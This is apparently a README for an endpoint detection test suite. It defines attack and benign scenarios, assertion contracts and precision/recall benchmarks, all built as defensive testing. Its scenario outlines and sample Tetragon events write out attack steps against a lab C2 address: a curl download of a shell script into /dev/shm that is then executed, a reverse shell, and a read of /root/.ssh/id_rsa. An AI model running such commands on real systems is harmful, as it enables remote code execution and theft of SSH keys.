# SysArmor Scenario Contracts

`scenarios/` 定义功能场景的输入和期望输出。它和 `workloads/` 的边界很重要:

- `scenarios/` 是安全/功能契约,带攻击或良性语义;`expected.yaml` 用于功能断言,`labels.yaml` 用于效果评估;
- `workloads/` 是压力源,用于性能评估;良性 workload 可用 `labels.yaml` 声明不得产生 signal/terminal 的效果标签。

每个场景目录通常包含:

```text
test/scenarios/<topology>/<scenario>/
├── attack.sh        scenario input, executed inside node-a
├── expected.yaml    functional assertion contract
└── labels.yaml      benchmark effectiveness ground truth labels
```

容器拓扑通常通过 `docker exec node-a ...` 触发。VM 拓扑通常通过 `vagrant ssh node-a ...` 触发。两种拓扑应尽量产出结构一致的 Event/Signal/Incident。

## Scenario Matrix

| Scenario | Type | Core Question | Expected |
|---|---|---|---|
| `apt-fileless-c2` | positive attack | 单 lineage 内的下载、执行、反弹 shell、凭据读取能否被端侧串起来 | endpoint terminal signal, incident=1 |
| `apt-staged-drop` | positive cross-lineage attack | 落盘和执行分属不同 lineage 时,云端 provenance graph 能否缝合 | endpoint terminal=0, incident=1 |
| `benign-ci-noise` | negative benign baseline | curl、编译、写 artifact 与攻击形态相似时是否不误报 | incident=0 |
| `lifecycle-smoke` | lifecycle smoke | agent 注册、policy、基础事件可见性是否正常 | agent visible, events visible |

这三个安全场景构成最小完备集:

```text
apt-fileless-c2  -> 正向检出:有攻击应响
apt-staged-drop  -> 横向能力:跨 lineage 才能成案
benign-ci-noise  -> 负向基线:相似良性行为不应误报
```

## Common Inputs

### Environment

| Input | Location | Role |
|---|---|---|
| container compose | `test/env/container/compose.yaml` | attacker/node-a/mgr/tetragon Docker topology |
| VM topology | `test/env/vm/Vagrantfile` | attacker/node-a VM topology |
| container images | `test/env/container/images/` | attacker C2, node-a workload host, mgr image |
| VM provision | `test/env/vm/provision/` | C2 setup, credentials setup |
| tracing policy | `test/env/resources/syscall-capture.yaml` | replay/debug/perf compatible Tetragon policy |
| fake token | `test/env/resources/registry-token` | benign/credential test material |

### Policy And Content

Scenario assertions may use local generated policies, collection policy files from `test/policies/`, and content packs from `test/content/`.

Important collection profiles:

| Policy | Purpose |
|---|---|
| `collection-minimal-high-signal.json` | low-cost high-confidence surface |
| `collection-edr-balanced.json` | default long-running EDR surface |
| `collection-incident-deep.json` | short-lived investigation surface |

Important content packs:

```text
context-credential-path-prefixes.json
context-payload-path-prefixes.json
context-persistence-path-prefixes.json
context-secret-volume-prefixes.json
ioc-c2-ip-feed.json
ioc-c2-port-feed.json
rulepack-cep-endpoint.json
```

### Tetragon TracingPolicy Shape

`test/env/resources/syscall-capture.yaml` is useful for replay, diagnostics, and performance-compatible paths. It focuses on network connect and sensitive file read:

```yaml
spec:
  kprobes:
  - call: "security_socket_connect"
    args: [sockaddr, int]

  - call: "security_file_permission"
    return: true
    args: [file, int]
```

Together with process exec/exit, this gives the basic behavior axes:

```text
process lineage
network socket
credential / sensitive file
```

The newer agent-owned path compiles collection policies into runtime sensor intent, but the same scenario semantics should remain stable.

## Scenario Details

### apt-fileless-c2

Shape:

```text
java-web or shell entry
  -> bash
  -> curl http://10.66.0.99:8080/x.sh -o /dev/shm/x.sh
  -> bash /dev/shm/x.sh
  -> reverse shell to 10.66.0.99:443
  -> cat /root/.ssh/id_rsa
```

Security meaning:

- fileless/staged execution from temporary memory-backed path;
- C2 download and reverse shell;
- sensitive credential read;
- one lineage contains enough evidence for endpoint detection.

Expected contract:

```text
events:
  must include CONNECT 10.66.0.99:8080
  must include CONNECT 10.66.0.99:443
  should include sensitive file read when policy enables it

endpoint_signals:
  must include reverse_shell_pattern
  terminal=true

incident:
  count=1
```

Typical lineage:

```text
entrypoint/init
  -> bash
  -> curl 10.66.0.99:8080/x.sh
  -> bash /dev/shm/x.sh
  -> bash -i / reverse shell
  -> cat /root/.ssh/id_rsa
```

### apt-staged-drop

Shape:

```text
lineage A:
  bash
    -> curl http://10.66.0.99:8080/helper
    -> write /var/lib/app/plugins/helper

GAP

lineage B:
  /var/lib/app/plugins/helper --report 10.66.0.99:443
```

Security meaning:

- download/write and later execution are intentionally split;
- a single endpoint lineage should not be enough to produce a terminal conclusion;
- cloud/provenance graph should connect the two lineages via the shared file node.

Expected contract:

```text
events:
  must include helper download
  must include helper execution or report connection

endpoint_signals:
  may include non-terminal payload/drop signals
  should not require a terminal endpoint-only chain

incident:
  count=1
  lineage_ids >= 2
  evidence contains /var/lib/app/plugins/helper

control_assertions:
  disabling cloud.cross_lineage should make incident count 0
```

Typical graph:

```text
curl -> /var/lib/app/plugins/helper <- helper execution -> 10.66.0.99:443
```

### benign-ci-noise

Shape:

```text
CI/build loop x N:
  bash build.sh
    -> read local cache
    -> copy/build artifact under /tmp/sysarmor-ci-*
    -> run shell/find/true utility commands
```

Security meaning:

- behavior is fully benign and local: no C2/IoC, no payload path, no credential read;
- repeated benign structure should avoid attack signal and incident creation;
- useful as false-positive and business-noise baseline.

Expected contract:

```text
events:
  may include repeated local exec and file activity

endpoint_signals:
  attack signals must be absent

incident:
  count=0

```

This scenario is the main guard against treating ordinary business noise as attack evidence.

### lifecycle-smoke

Shape:

```text
start topology
start or connect agent
emit a small known event stream
query agent/manager status and events
```

Expected contract:

```text
lifecycle:
  agent_registered=true
  events_visible=true
  stable_id and lineage_id should exist where expected
  no panic / no OOM
```

This scenario is not a security detection test. It is a path-health smoke test.


## Labels YAML For Effectiveness

`labels.yaml` 是 benchmark effectiveness 的 ground truth。它不描述测试流程,只描述 workload 窗口里真实应覆盖的 event/signal 标签。Evaluator 会把 observed events/signals 归一化成 canonical entities,再计算 precision/recall。

```yaml
name: apt-staged-drop
kind: malicious
window: workload
labels:
  events:
    - id: helper_write
      required: true
      behavior: file.write
      match:
        path: /var/lib/app/plugins/helper
  signals:
    - id: payload_dropped
      required: true
      name: payload_dropped
      terminal: false
      entities:
        - file:/var/lib/app/plugins/helper
      link_events:
        - helper_write
policy:
  terminal_signals_allowed: 0
```

主表指标保持简洁:

| Metric | Meaning |
|---|---|
| `event_recall` | required event labels matched by observed events |
| `signal_recall` | required signal labels matched by observed signals |
| `terminal_recall` | required terminal signal labels matched |
| `signal_precision` | observed signals that map to signal labels |
| `event_noise_ratio` | observed events not mapped to event labels |
| `signal_event_link_rate` | matched signals whose event refs resolve to matched event labels |
| `false_positive_signals` | observed signals not mapped to any signal label |

`truth_steps.csv` 展开每个 label 的命中明细,用于解释 matrix 分数。

## Expected YAML Contract

`expected.yaml` is intentionally declarative. A typical file may contain:

```yaml
events:
  must_contain:
    - { kind: CONNECT, dst: "10.66.0.99:443" }

endpoint_signals:
  must_contain:
    - { name: reverse_shell_pattern, terminal: true }

cloud_signals:
  must_contain:
    - { name: staged_payload_chain }

incident:
  count: 1
  lineage_ids_min: 2
  converge_method: "rarity+causal-topk"

negative:
  endpoint_terminal_count: 0

control_assertions:
  - disable: cloud.cross_lineage
    then_incident_count: 0
```

Current assertion layers:

| Layer | What It Checks | Main Entrypoint |
|---|---|---|
| L1 Events | raw/normalized event visibility | `suites/local-agent/capture-vm.sh`, `suites/manager-cloud/capture-container.sh`, `tools/assertions/assert.py`, `tools/assertions/assert-vm-local.sh` |
| L2 Endpoint signals | local endpoint rules and event refs | `tools/assertions/assert-vm-local.sh`, `suites/local-agent/`, `suites/agent-runtime/` |
| L3 Cloud signals | manager/analytics rule output | `tools/assertions/assert.py`, `suites/manager-cloud/` |
| L4 Incidents | convergence, evidence, lifecycle state | `suites/manager-cloud/e2e-incident*.sh`, graph/evidence e2e |
| Negative | absence of terminal signals or incidents | scenario expected files |
| Control | counterfactual behavior when a capability is disabled | `control_assertions` |

`tools/assertions/assert.py` is the generic historical assertion entrypoint.
Focused product checks live in `test/suites/<suite>/`, especially for local VM
agent paths, graph/evidence, response, agent session, and
`AgentControlPlaneService.Connect` behavior.

## Event And Signal Output

Scenario and recorder output usually lands under `test/.results/`.

Functional outputs:

```text
test/.results/
├── <topology>.<scenario>.events.ndjson
├── <topology>.<scenario>.signals.ndjson
├── <topology>.<scenario>.local.json
├── <topology>.<scenario>.linked.json
└── <topology>.<scenario>.json
```

Recorder/benchmark outputs:

```text
test/.results/recordings/<run-id>/
├── timeline.csv
├── markers.ndjson
├── events.ndjson
├── events-all.ndjson
├── signals.ndjson
├── signals-all.ndjson
├── event-watch.err
├── event-all-watch.err
├── signal-watch.err
├── signal-all-watch.err
└── summary.json

test/.results/bench-collection-vm/<run-id>/
├── matrix.csv
├── matrix.json
├── detection-apply.json
└── <policy-name>/
    ├── summary.json
    ├── timeline.csv
    ├── events.ndjson
    ├── events-all.ndjson
    ├── signals.ndjson
    ├── signals-all.ndjson
    ├── event-watch.err
    ├── event-all-watch.err
    ├── signal-watch.err
    ├── signal-all-watch.err
    ├── detection-apply.json
    ├── collection-apply.json
    ├── workload.out
    └── workload.err
```

`events.ndjson` and `signals.ndjson` are cumulative recorder outputs scoped by benchmark labels. `events-all.ndjson` and `signals-all.ndjson` are cumulative outputs from the same watchers without label filters. If scoped frames are empty but `*-all.ndjson` is not, the issue is usually label/window scoping. If both are empty, inspect `detection-apply.json`, `summary.json.diagnostics`, and the watch stderr files before treating the scenario as a detection miss.

Effectiveness reports evaluate only the workload window bounded by `workload_start` and `workload_done`. Full recorder totals are preserved separately as `observed_events_total` and `observed_signals_total`, so policy apply or VM login noise can be audited without being counted as scenario evidence.

Common raw Tetragon event shapes:

| Raw type | Meaning | Important fields |
|---|---|---|
| `process_exec` | process start | `exec_id`, `pid`, `binary`, `arguments`, `parent_exec_id`, container/host metadata |
| `process_exit` | process exit | `exec_id`, `pid` |
| `process_kprobe` | kernel probe event | `function_name`, `args`, `policy_name` |

Common normalized behavior axes:

| Behavior | Example |
|---|---|
| process lineage | bash -> curl -> helper |
| network connect | 10.66.0.99:8080 / 10.66.0.99:443 |
| file write/chmod | `/dev/shm/x.sh`, `/var/lib/app/plugins/helper` |
| file read | `/root/.ssh/id_rsa`, secret paths |

## Example Raw Events

Process lineage:

```json
{
  "process_exec": {
    "process": {
      "exec_id": "MzYyMzZmZTY1ZjVmOjIxNDc4...",
      "pid": 16783,
      "binary": "/usr/bin/bash",
      "arguments": "-c \"curl -s http://10.66.0.99:8080/x.sh -o /dev/shm/x.sh\"",
      "parent_exec_id": "MzYyMzZmZTY1ZjVmOjEyNjM4..."
    },
    "parent": {
      "pid": 14354,
      "binary": "/usr/local/bin/entrypoint.sh"
    }
  }
}
```

Network connect:

```json
{
  "process_kprobe": {
    "process": {
      "pid": 16789,
      "binary": "/usr/bin/curl",
      "arguments": "-s http://10.66.0.99:8080/x.sh -o /dev/shm/x.sh"
    },
    "function_name": "security_socket_connect",
    "args": [
      { "sockaddr_arg": { "family": "AF_INET", "addr": "10.66.0.99", "port": 8080 } },
      { "int_arg": 16 }
    ],
    "policy_name": "sysarmor-syscall-capture"
  }
}
```

Sensitive file read:

```json
{
  "process_kprobe": {
    "process": {
      "pid": 16804,
      "binary": "/usr/bin/cat",
      "arguments": "/root/.ssh/id_rsa"
    },
    "function_name": "security_file_permission",
    "args": [
      { "file_arg": { "path": "/root/.ssh/id_rsa", "permission": "-rw-------" } },
      { "int_arg": 4 }
    ],
    "return": { "int_arg": 0 }
  }
}
```

## Control Assertions

Control assertions are counterfactual checks: if an important capability is disabled or swapped out, the result should change in a predictable way.

Examples:

```yaml
# benign-ci-noise: naive additive scoring should false positive
control_assertions:
  - switch: "converge.mode=additive_threshold"
    then_incident_count_min: 1
```

```yaml
# apt-staged-drop: cross-lineage graph is necessary
control_assertions:
  - disable: cloud.cross_lineage
    then_incident_count: 0
```

These assertions are useful because they prove a feature is necessary, not just present.

## Effectiveness And Efficiency

Functional tests still use `expected.yaml` for pass/fail assertions. Benchmark effectiveness uses `labels.yaml` as ground truth and computes event/signal precision-recall from recorder outputs. Performance metrics continue to come from recorder phase summaries.

Current entrypoint:

```bash
make -C test sync-vm-agent
make -C test effectiveness-report TOPO=vm RUN_ID=manual
```

When used after `make -C test bench-matrix-vm`, the report is written to:

```text
test/.results/effectiveness/<run-id>/
├── summary.json
├── matrix.csv
├── matrix.json
├── truth_steps.csv
├── policy_comparison.csv
└── policy_comparison.json
```

`matrix.csv` keeps one row per workload/scenario/policy with `event_recall`, `signal_recall`, `signal_precision`, false-positive counts, observed counts, drop/parse-error rates, and CPU cost per 1k events. `truth_steps.csv` keeps one row per label so misses are easy to inspect.

`policy_comparison.csv` aggregates labels-based effectiveness and workload resource cost per policy. It is the main table for comparing collection profiles as product options.
